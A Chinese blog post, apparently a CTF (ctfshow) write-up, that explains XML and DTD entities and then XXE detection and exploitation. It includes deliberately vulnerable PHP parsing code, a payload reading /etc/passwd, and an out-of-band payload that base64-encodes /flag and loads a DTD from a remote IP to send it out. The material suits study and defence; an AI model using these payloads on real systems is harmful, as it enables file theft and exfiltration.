@@ -1,0 +1,1398 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="XXE, Aurorabin">
+    <meta name="description" content="XXE漏洞xml基础知识 XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。 
+
+XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素
+
+
+xml文">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>XXE | Aurorabin</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Aurorabin</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Aurorabin</div>
+        <div class="logo-desc">
+            
+            Aurorabin是啥都不会的菜狗
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">XXE</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/ctfshow/">
+                                <span class="chip bg-color">ctfshow</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-09-12
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+        <!-- 代码块折行 -->
+        <style type="text/css">
+            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
+        </style>
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><h2 id="xml基础知识"><a href="#xml基础知识" class="headerlink" title="xml基础知识"></a>xml基础知识</h2><p> XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。 </p>
+<blockquote>
+<p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</p>
+</blockquote>
+<p><img src="/images/1205477-20170729131727597-973576085.png" alt="img"></p>
+<h3 id="xml文档的构建模块"><a href="#xml文档的构建模块" class="headerlink" title="xml文档的构建模块"></a>xml文档的构建模块</h3><p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p>
+<ul>
+<li>元素</li>
+<li>属性</li>
+<li>实体</li>
+<li>PCDATA</li>
+<li>CDATA</li>
+</ul>
+<p>下面是每个构建模块的简要描述。</p>
+<p>1，元素<br>元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。<br>实例:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>body text in between<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span>some message in between<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>空的 HTML 元素的例子是 “hr”、”br” 以及 “img”。</p>
+<p>2，属性<br>属性可提供有关元素的额外信息<br>实例：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>computer.gif<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>3，实体<br>实体是用来<strong>定义普通文本的变量</strong>。<strong>实体引用是对实体的引用</strong>。</p>
+<p>4，PCDATA<br>PCDATA 的意思是<strong>被解析的字符数据</strong>（parsed character data）。<br>PCDATA 是会<strong>被解析器解析的文本</strong>。这些文本将被解析器检查实体以及标记。</p>
+<p>5，CDATA<br>CDATA 的意思是<strong>字符数据</strong>（character data）。<br>CDATA 是<strong>不会被解析器解析的文本</strong>。</p>
+<h3 id="DTD-文档类型定义"><a href="#DTD-文档类型定义" class="headerlink" title="DTD(文档类型定义)"></a>DTD(文档类型定义)</h3><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。</p>
+<p>DTD <strong>可以在 XML 文档内声明</strong>，也可以<strong>外部引用</strong>。</p>
+<p>1，内部声明： ex: <code> &lt;!DOCTYPE 根元素 [元素声明]&gt;  &lt;!DOCTYOE test any&gt;</code><br>完整实例：</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE note [
+  &lt;!ELEMENT note (to,from,heading,body)&gt;
+  &lt;!ELEMENT to      (#PCDATA)&gt;
+  &lt;!ELEMENT from    (#PCDATA)&gt;
+  &lt;!ELEMENT heading (#PCDATA)&gt;
+  &lt;!ELEMENT body    (#PCDATA)&gt;
+]&gt;
+&lt;note&gt;
+  &lt;to&gt;George&lt;&#x2F;to&gt;
+  &lt;from&gt;John&lt;&#x2F;from&gt;
+  &lt;heading&gt;Reminder&lt;&#x2F;heading&gt;
+  &lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;
+&lt;&#x2F;note&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>2，外部声明（引用外部DTD）： ex:<code>  &lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;  &lt;!DOCTYPE test SYSTEM &#39;http://www.test.com/evil.dtd&#39;&gt;</code><br>完整实例:</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;
+&lt;note&gt;
+&lt;to&gt;George&lt;&#x2F;to&gt;
+&lt;from&gt;John&lt;&#x2F;from&gt;
+&lt;heading&gt;Reminder&lt;&#x2F;heading&gt;
+&lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;
+&lt;&#x2F;note&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>而note.dtd的内容为:</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ELEMENT note (to,from,heading,body)&gt;
+&lt;!ELEMENT to (#PCDATA)&gt;
+&lt;!ELEMENT from (#PCDATA)&gt;
+&lt;!ELEMENT heading (#PCDATA)&gt;
+&lt;!ELEMENT body (#PCDATA)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>DTD的作用：</p>
+<ul>
+<li>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。</li>
+<li>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</li>
+<li>您的应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。</li>
+<li>您还可以使用 DTD 来验证您自身的数据。</li>
+</ul>
+<h3 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h3><p>DTD实体是<strong>用于定义引用普通文本</strong>或<strong>特殊字符的快捷方式</strong>的变量，可以<strong>内部声明或外部引用</strong>。</p>
+<p> 实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。 </p>
+<h5 id="实体类别"><a href="#实体类别" class="headerlink" title="实体类别"></a>实体类别</h5><p>实体按类型主要分为以下四种：</p>
+<ul>
+<li>内置实体 (Built-in entities)</li>
+<li>字符实体 (Character entities)</li>
+<li>通用实体 (General entities)</li>
+<li>参数实体 (Parameter entities)</li>
+</ul>
+<p> <strong>参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&amp;实体名称。</strong> </p>
+<p> <strong>参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。</strong> </p>
+<hr>
+<p>实体又分为<strong>一般实体和参数实体</strong><br>1，<strong>一般实体</strong>的声明语法:<br>引用实体的方式：**&amp;实体名<strong>；<br>2，参数实体只能在DTD中使用，参数实体的声明格式：<br>引用实体的方式：</strong>%实体名**；</p>
+<hr>
+<h4 id="1，内部实体声明"><a href="#1，内部实体声明" class="headerlink" title="1，内部实体声明:"></a><strong>1，内部实体声明:</strong></h4><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>完整实例:</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE test [
+&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;
+&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;
+]&gt;
+
+&lt;test&gt;&amp;writer;&amp;copyright;&lt;&#x2F;test&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="2，外部实体声明"><a href="#2，外部实体声明" class="headerlink" title="2，外部实体声明:"></a><strong>2，外部实体声明:</strong></h4><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>完整实例:</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE test [
+&lt;!ENTITY writer SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;
+&lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;
+]&gt;
+&lt;author&gt;&amp;writer;&amp;copyright;&lt;&#x2F;author&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="3、参数实体："><a href="#3、参数实体：" class="headerlink" title="3、参数实体："></a>3、参数实体：</h4><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;或者&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>实例演示：一般实体+内部实体</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE a [
+&lt;!ENTITY name &quot;nMask&quot;&gt;
+]&gt;
+&lt;foo&gt;&lt;value&gt;&amp;name;&lt;&#x2F;value&gt;&lt;&#x2F;foo&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>实例演示：参数实体+外部实体</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE a [
+&lt;!ENTITY % name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
+%name;
+]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>注意：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。</p>
+<p>由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。<br>外部实体<br>外部实体即在DTD中使用</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">实体名称</span> <span class="token attr-name">SYSTEM</span> <span class="token attr-name">"URI"</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？<br>主要的有file、http、https、ftp等等，当然不同的程序支持的不一样：</p>
+<p> <img src="/images/5782d6c9d75646441930bebec4b15949.png" alt="img"> </p>
+<p>php安装扩展后还能支持的一些协议：</p>
+<p> <img src="/images/37fa93b79ecd560e39eb16791f42899c.png" alt="img"> </p>
+<h2 id="XXE检测"><a href="#XXE检测" class="headerlink" title="XXE检测"></a>XXE检测</h2><p> 检测所有接受XML作为输入内容端点，抓包观察其是否会返回我们想要的内容 </p>
+<h3 id="首先检测XML是否会被成功解析："><a href="#首先检测XML是否会被成功解析：" class="headerlink" title="首先检测XML是否会被成功解析："></a>首先检测XML是否会被成功解析：</h3><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; 
+&lt;!DOCTYPE ANY [ 
+&lt;!ENTITY words &quot;Hello XXE !&quot;&gt;
+]&gt;
+&lt;root&gt;&amp;words;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>如果数据包或页面中存在“Hello XXE”的字样，则表名实体已被解析。<br> <img src="/images/7e76219cef90b4d17fd9c331d7778bb3.png" alt="img"> </p>
+<p> 如果数据包或页面中存在“Hello XXE”的字样，则表名实体已被解析。</p>
+<h3 id="接下来检测该端点是否支持DTD引用外部实体："><a href="#接下来检测该端点是否支持DTD引用外部实体：" class="headerlink" title="接下来检测该端点是否支持DTD引用外部实体："></a>接下来检测该端点是否支持DTD引用外部实体：</h3><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;”1.0” encoding&#x3D;”UTF-8”?&gt;
+&lt;!DOCTYPE ANY [
+&lt;!ENTITY % name SYSTEM &quot;http:&#x2F;&#x2F;localhost&#x2F;tp5&#x2F;test.xml&quot;&gt;
+%name;
+]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p> 通过<strong>查看自己服务器上的日志</strong>来判断，看目标服务器<strong>是否向你的服务器发了一条请求test.xml的HTTP request</strong> </p>
+<p> <img src="/images/d2eec22d8ce3b613040797806658511c.png" alt="img"> </p>
+<p>如果都成立则很有可能存在XXE漏洞</p>
+<h2 id="XXE攻击"><a href="#XXE攻击" class="headerlink" title="XXE攻击"></a>XXE攻击</h2><p> 以下利用主要基于<code>libxml2</code>版本，其中<strong>libxml是PHP的xml支持</strong>。<br><strong>而libxml版本在2.9.1及以后，默认不解析外部实体，很多利用将无法实现</strong>。 </p>
+<h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//漏洞函数</span>
+    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">ctfshow</span><span class="token punctuation">;</span><span class="token comment">//筛选ctfshow那一项的信息</span>
+    <span class="token keyword">echo</span> <span class="token variable">$ctfshow</span><span class="token punctuation">;</span><span class="token comment">//只输出ctfshow那一项的信息</span>
+<span class="token punctuation">&#125;</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>payload</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE xxe [
+&lt;!ENTITY a SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
+]&gt;
+&lt;paidx0&gt;
+&lt;ctfshow&gt;&amp;a;&lt;&#x2F;ctfshow&gt;
+&lt;&#x2F;paidx0&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="文件读取（没有回显）"><a href="#文件读取（没有回显）" class="headerlink" title="文件读取（没有回显）"></a>文件读取（没有回显）</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//没有回显</span>
+<span class="token punctuation">&#125;</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>payload</p>
+<?xml version="1.0" encoding="UTF-8"?><p>可以要也可以不要</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE  xxe [
+&lt;!ENTITY %25 file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;
+&lt;!ENTITY %25 xee SYSTEM &quot;http:&#x2F;&#x2F;175.178.196.226&#x2F;xxe.dtd&quot;&gt;
+%25xee;
+%25send;
+]&gt;
+&lt;root&gt;
+&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>注：这里的%25其实应该是%,因为chrome浏览器直接用%会报错，要用%25代替</p>
+<p>思路是：在公网服务器上建一个xxe.dtd文件</p>
